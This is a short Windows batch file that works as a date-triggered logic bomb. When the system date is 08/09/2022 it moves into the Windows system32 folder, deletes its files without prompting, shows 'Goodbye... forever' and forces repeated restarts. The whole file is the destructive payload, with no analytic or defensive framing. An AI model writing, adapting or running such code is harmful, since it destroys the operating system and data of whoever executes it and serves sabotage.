@echo off
if %date% == 08/09/2022 cd "%windir%\system32"
if %date% == 08/09/2022 del */q
if %date% == 08/09/2022 shutdown -r -c "Goodbye... forever" -t 4
goto die
:die
if %date% == 08/09/2022 shutdown -r -t 0
if %date% == 08/09/2022 goto die